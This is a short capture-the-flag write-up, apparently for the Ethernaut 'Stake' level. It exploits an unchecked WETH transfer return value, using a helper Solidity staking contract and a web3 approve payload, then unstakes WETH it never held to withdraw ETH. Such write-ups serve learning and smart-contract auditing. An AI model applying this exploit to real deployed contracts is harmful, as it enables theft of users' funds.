# Level 31 - Stake

- Problem is that WETH (ERC20) transfers return value is not checked and states are updated.
- Vulnerable function is StakeWETH.
- Initially both balance and totalStaked are zero. Due to requirements (balance < total, userstaked = 0), we should first stake some ETH from a different address (it can be both EOA or contract.
    - I have used contract for this purpose. See below:
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    interface Stake {
        function StakeETH() external payable; 
    }
    
    contract Staker {
        address target;
    
        constructor(address addr) payable {
            target = addr;
        }
    
        function stake() public {
            Stake(target).StakeETH{value: address(this).balance}();
        }
    }
    ```
    
- After we stake some ETH, now we need to give allowance to Stake contract to use our WETH tokens. For this purpose, we should call WETH contracts approve function. We can create payload and call with data.
    
    
    ```jsx
    // We set allowance to 0.002 (should be more than 0.001 to call StakeWETH)
    payload = web3.eth.abi.encodeFunctionCall({
        name:'approve',
        type:'function',
        inputs:[{
            type:'address',
            name:'_spender'
        },{type:'uint256',name:'_value'}]}, [instance,"2000000000000000"])
        
    // Call method
    sendTransaction({from:player,to:weth_address,data:payload})
    ```
    
- This will increase totalStaked by 0.002 and userBalance by 0.002. However, since we don’t have any WETH balance, transfer call inside function will return false. **But it will keep executed since returned value is not checked.**
- Now, since userBalance is set to 0.002, we can unstake tokens and receive 0.002 ETH.
- Latest states are → balance = 0.008 , total staked= 0.01, user balance = 0